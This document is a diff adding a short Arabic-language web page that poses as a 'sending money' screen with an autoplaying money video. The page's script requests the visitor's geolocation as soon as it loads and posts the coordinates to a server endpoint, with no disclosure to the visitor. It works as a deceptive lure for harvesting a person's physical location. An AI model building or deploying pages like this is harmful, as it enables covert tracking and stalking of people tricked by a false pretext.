@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>جاري إرسال المال...</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    video {
+      width: 100%;
+      height: auto;
+    }
+  </style>
+</head>
+<body>
+  <video id="moneyVideo" autoplay muted playsinline>
+    <source src="/static/money.mp4" type="video/mp4" />
+    متصفحك لا يدعم عرض الفيديو.
+  </video>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: lat, longitude: lon }),
+      });
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
+      (err) => console.log("فشل في الحصول على الموقع", err)
+    );
+  </script>
+</body>
+</html>
